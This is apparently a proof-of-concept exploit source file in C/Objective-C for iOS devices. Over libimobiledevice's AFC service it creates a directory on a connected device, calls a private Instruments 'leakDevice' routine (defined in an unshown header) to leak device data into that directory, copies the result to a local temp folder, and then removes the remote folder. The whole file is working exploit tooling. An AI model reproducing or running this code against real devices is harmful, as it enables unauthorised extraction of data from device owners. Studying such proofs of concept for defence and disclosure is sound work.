#include <assert.h>
#include <ftw.h>
#include <stdio.h>
#include <string.h>

#include <libimobiledevice/afc.h>
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>

#import "Instruments.h"
#include <Foundation/Foundation.h>

#define LABEL "cc"

#define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)

#define DEV_OK(expr) assert(expr == IDEVICE_E_SUCCESS)
#define LD_OK(expr) assert(expr == LOCKDOWN_E_SUCCESS)
#define AFC_OK(expr) assert(expr == AFC_E_SUCCESS)

#define AFC_CHECK(expr)                                                                                                \
  err = expr;                                                                                                          \
  if (err != AFC_E_SUCCESS)                                                                                            \
    return err;

afc_error_t afc_cp_file(afc_client_t afc, const char *remote, const char *local) {
  afc_error_t err = AFC_E_SUCCESS;
  uint64_t handle = 0;
  AFC_CHECK(afc_file_open(afc, remote, AFC_FOPEN_RDONLY, &handle));

  int fd = open(local, O_CREAT | O_APPEND | O_RDWR, 0644);
  if (fd == -1) {
    LOG("FATAL ERROR: could not open local file '%s' for writing", local);
    return AFC_E_IO_ERROR;
  }

  LOG("download: %s -> %s", remote, local);
  char buf[1024 * 1024 * 4];
  uint32_t bytes_read = 0;
  while (TRUE) {
    AFC_CHECK(afc_file_read(afc, handle, buf, sizeof buf, &bytes_read));
    if (bytes_read <= 0) break;
    write(fd, buf, bytes_read);
  }

  afc_file_close(afc, handle);
  close(fd);
  return err;
}

afc_error_t afc_cp_dir(afc_client_t afc, const char *remote, const char *local) {
  char **list = NULL;
  afc_error_t err = AFC_E_SUCCESS;
  int count = 0;
  char remote_name[PATH_MAX];
  char local_name[PATH_MAX];
  AFC_CHECK(afc_read_directory(afc, remote, &list));

  char **p = list;
  while (*p) {
    if (strcmp(*p, "..") == 0 || strcmp(*p, ".") == 0) {
      goto next;
    }

    count = snprintf(remote_name, sizeof remote_name, "%s/%s", remote, *p);
    assert(count >= 0 && count < sizeof remote_name);
    snprintf(local_name, sizeof(local_name), "%s/%s", local, *p);
    assert(count >= 0 && count < sizeof local_name);
    afc_cp_file(afc, remote_name, local_name);

  next:
    p++;
  }
  afc_dictionary_free(list);
  return err;
}

void leak(const char *remote) {
  // this part can also be port to open source solutions
  // https://github.com/frida/frida-core/blob/8726e/src/fruity/dtx.vala
  @autoreleasepool {
    NSString *path = [NSString stringWithUTF8String:remote];
    Instruments *api = [[Instruments alloc] init];
    XRRemoteDevice *device = [api devices].firstObject;
    // [api warmupForDevice:device];
    NSString *leaked = [api leakDevice:device to:path];
    printf("%s\n", leaked.UTF8String);
  }
}

static int rm(const char *pathname, const struct stat *sbuf, int type, struct FTW *ftwb) {
  if (remove(pathname) < 0) {
    perror("ERROR: remove");
    return -1;
  }
  return 0;
}

int main(int argc, char *argv[]) {
  idevice_t dev = NULL;
  lockdownd_service_descriptor_t port = NULL;
  lockdownd_client_t lockdown = NULL;
  afc_client_t afc;
  char *udid;

  DEV_OK(idevice_new(&dev, NULL));
  DEV_OK(idevice_get_udid(dev, &udid));
  LOG("uuid: %s", udid);
  LD_OK(lockdownd_client_new_with_handshake(dev, &lockdown, LABEL));
  LD_OK(lockdownd_start_service(lockdown, "com.apple.afc", &port));
  AFC_OK(afc_client_new(dev, port, &afc));

  char template[] = "/tmp/leak-poc.XXXXXX";
  char *local = mkdtemp(template);
  char *remote = NULL;
  {
    char *p = template + sizeof(template);
    while (*p != '/' && p > template)
      p--;
    remote = p;
  }

  LOG("temp: %s", local);
  LOG("remote: %s", remote);

  // mess up
  AFC_OK(afc_make_directory(afc, remote));
  printf("%s/", local);
  leak(remote);
  // getchar();
  // cp -r
  afc_cp_dir(afc, remote, local);

  // cleanup
  AFC_OK(afc_remove_path_and_contents(afc, remote));
  // nftw(local, rm, 10, FTW_DEPTH|FTW_MOUNT|FTW_PHYS);

  lockdownd_client_free(lockdown);
  idevice_free(dev);

  afc = NULL;
  dev = NULL;
  lockdown = NULL;
  return 0;
}